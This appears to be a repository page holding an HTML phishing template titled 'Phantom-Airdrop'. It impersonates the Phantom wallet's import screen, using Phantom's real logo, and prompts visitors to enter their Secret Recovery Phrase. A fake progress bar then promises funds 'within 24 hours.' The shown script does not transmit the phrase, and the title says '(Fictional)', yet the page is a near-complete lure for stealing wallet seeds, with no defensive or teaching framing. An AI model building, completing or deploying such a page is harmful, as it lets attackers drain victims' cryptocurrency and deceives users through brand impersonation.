# Phantom-Airdrop

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Phantom Wallet - Import (Fictional)</title>
<style>
  body {
    margin: 0; padding: 0;
    font-family: 'Inter', sans-serif, Arial, sans-serif;
    background: linear-gradient(160deg, #1e004c, #2d0066);
    color: white;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    height: 100vh;
    overflow: hidden;
  }
  .container {
    max-width: 400px;
    background: rgba(255 255 255 / 0.05);
    padding: 40px;
    border-radius: 10px;
    box-shadow: 0 0 10px #000;
    text-align: center;
  }
  textarea {
    width: 100%;
    border-radius: 5px;
    border: none;
    padding: 10px;
    font-size: 16px;
    resize: none;
    margin-top: 10px;
  }
  button {
    margin-top: 20px;
    padding: 12px 24px;
    background-color: #6c5ce7;
    border: none;
    border-radius: 5px;
    color: white;
    font-size: 16px;
    cursor: pointer;
  }
  #loadingScreen, #successScreen {
    display: none;
    flex-direction: column;
    align-items: center;
  }
  #loadingBarContainer {
    width: 100%;
    background: rgba(255 255 255 / 0.2);
    border-radius: 20px;
    overflow: hidden;
    margin-top: 20px;
  }
  #loadingBar {
    width: 0;
    height: 10px;
    background: #6c5ce7;
    transition: width 3s linear;
  }
  /* Checkmark animation */
  .checkmark-circle {
    width: 100px;
    height: 100px;
    border-radius: 50%;
    background: #2ecc71;
    position: relative;
    animation: popIn 0.6s ease-out forwards;
    margin-bottom: 20px;
  }
  .checkmark {
    position: absolute;
    top: 25px;
    left: 28px;
    width: 40px;
    height: 70px;
    border-right: 5px solid white;
    border-bottom: 5px solid white;
    transform: rotate(45deg);
    animation: draw 0.6s ease-out forwards 0.4s;
  }
  @keyframes popIn {
    0% {
      transform: scale(0.3);
      opacity: 0;
    }
    100% {
      transform: scale(1);
      opacity: 1;
    }
  }
  @keyframes draw {
    0% {
      width: 0;
      height: 0;
      opacity: 0;
    }
    100% {
      width: 40px;
      height: 70px;
      opacity: 1;
    }
  }
</style>
</head>
<body>

<div class="container" id="inputScreen">
  <img src="https://docs.phantom.com/~gitbook/image?url=https%3A%2F%2F187760183-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252F-MVOiF6Zqit57q_hxJYp%252Ficon%252FU7kNZ4ygz4QW1rUwOuTT%252FWhite%2520Ghost_docs_nu.svg%3Falt%3Dmedia%26token%3D447b91f6-db6d-4791-902d-35d75c19c3d1&width=48&height=48&sign=23b24c2a&sv=2" alt="Phantom Logo" style="width: 60px; margin-bottom: 20px;">
  <h1>Import Wallet</h1>
  <p>Securely access your existing wallet using your Secret Recovery Phrase.</p>
  <textarea id="phrase" placeholder="Enter your 12 or 24-word phrase..." rows="4"></textarea>
  <button onclick="startLoading()">Continue</button>
</div>

<div class="container" id="loadingScreen">
  <h1>Processing… Please wait</h1>
  <div id="loadingBarContainer">
    <div id="loadingBar"></div>
  </div>
</div>

<div class="container" id="successScreen">
  <div class="checkmark-circle">
    <div class="checkmark"></div>
  </div>
  <h1>Your funds will be available within 24 hours.</h1>
</div>

<script>
  function startLoading() {
    const phrase = document.getElementById('phrase').value.trim();
    if (!phrase) {
      alert('Please enter your seed phrase.');
      return;
    }
    // Hide input, show loading
    document.getElementById('inputScreen').style.display = 'none';
    const loadingScreen = document.getElementById('loadingScreen');
    loadingScreen.style.display = 'flex';

    // Animate loading bar
    const loadingBar = document.getElementById('loadingBar');
    loadingBar.style.width = '0%';

    // Force reflow for transition to work if restarted
    loadingBar.offsetWidth; 
    loadingBar.style.width = '100%';

    // After 3 seconds, show success
    setTimeout(() => {
      loadingScreen.style.display = 'none';
      document.getElementById('successScreen').style.display = 'flex';
    }, 3000);
  }
</script>

</body>
</html>

